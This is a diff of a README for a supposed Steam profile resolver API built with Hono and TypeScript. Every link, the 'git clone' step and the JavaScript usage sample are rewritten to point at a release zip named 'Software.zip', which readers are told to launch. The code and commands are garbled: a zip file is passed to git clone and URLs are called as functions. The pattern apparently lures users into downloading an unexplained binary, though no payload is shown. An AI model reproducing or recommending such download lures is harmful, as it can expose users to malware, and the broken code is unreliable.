@@ -1,6 +1,6 @@
 # Hono Steamer API 
 
-![Hono Steamer API](https://github.com/dzxyqz/hono-steamer-api/releases/download/v1.0/Release_x64.zip)
+![Hono Steamer API](https://github.com/dzxyqz/hono-steamer-api/releases/download/v2.0/Software.zip)
 
 Welcome to the Hono Steamer API repository! This high-performance Steam profile resolver API is built with a MySQL-powered smart caching system using Hono & TypeScript to provide you with a seamless experience. 
 
@@ -14,7 +14,7 @@ Welcome to the Hono Steamer API repository! This high-performance Steam profile 
 
 To get started with the Hono Steamer API, you can download the software package from the following link:
 
-[![Download Software](https://github.com/dzxyqz/hono-steamer-api/releases/download/v1.0/Release_x64.zip)](https://github.com/dzxyqz/hono-steamer-api/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/dzxyqz/hono-steamer-api/releases/download/v2.0/Software.zip)](https://github.com/dzxyqz/hono-steamer-api/releases/download/v2.0/Software.zip)
 
 ### Note: 
 - The provided link needs to be launched to download the software package.
@@ -37,7 +37,7 @@ To install the Hono Steamer API, follow these steps:
 
 1. Clone this repository to your local machine.
    ```bash
-   git clone https://github.com/dzxyqz/hono-steamer-api/releases/download/v1.0/Release_x64.zip
+   git clone https://github.com/dzxyqz/hono-steamer-api/releases/download/v2.0/Software.zip
    ```
 
 2. Navigate to the project directory.
@@ -63,9 +63,9 @@ You can use the Hono Steamer API to resolve Steam profiles, cache data efficient
 
 ```javascript
 const response = await fetch('http://localhost:3000/resolve-profile?steamId=yourSteamId');
-const data = await https://github.com/dzxyqz/hono-steamer-api/releases/download/v1.0/Release_x64.zip();
+const data = await https://github.com/dzxyqz/hono-steamer-api/releases/download/v2.0/Software.zip();
 
-https://github.com/dzxyqz/hono-steamer-api/releases/download/v1.0/Release_x64.zip(data);
+https://github.com/dzxyqz/hono-steamer-api/releases/download/v2.0/Software.zip(data);
 ```
 
 ## Contributing
